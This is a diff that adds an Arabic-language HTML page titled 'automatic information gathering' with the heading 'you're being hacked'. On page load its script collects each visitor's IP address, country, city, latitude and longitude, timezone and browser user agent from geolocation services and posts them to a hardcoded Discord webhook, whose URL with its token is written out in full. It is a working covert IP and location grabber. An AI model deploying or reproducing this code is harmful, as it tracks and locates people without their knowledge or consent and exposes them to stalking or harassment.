@@ -1,1 +1,54 @@
-كل تبن بس
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جمع المعلومات تلقائي</title>
+</head>
+<body>
+  <h2>جارٍ تهكيرك و دعسك...</h2>
+
+  <script>
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv';
+
+    async function sendUserInfo() {
+      try {
+        const [geoRes, ipRes] = await Promise.all([
+          fetch('https://ipapi.co/json/'),
+          fetch('https://api.ipify.org?format=json')
+        ]);
+
+        const geoData = await geoRes.json();
+        const ipData = await ipRes.json();
+
+        const ipv4 = ipData.ip || 'غير معروف';
+        const userAgent = navigator.userAgent;
+        const latitude = geoData.latitude || 'غير متوفر';
+        const longitude = geoData.longitude || 'غير متوفر';
+
+        const message = `
+IPv4: ${ipv4}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+الموقع: ${latitude}, ${longitude}
+المنطقة الزمنية: ${geoData.timezone}
+المتصفح والجهاز: ${userAgent}
+        `.trim();
+
+        await fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+
+        console.log('تم إرسال المعلومات بنجاح');
+      } catch (err) {
+        console.error('فشل في إرسال المعلومات:', err);
+      }
+    }
+
+    // تشغيل تلقائي عند فتح الصفحة
+    window.addEventListener('load', sendUserInfo);
+  </script>
+</body>
+</html>
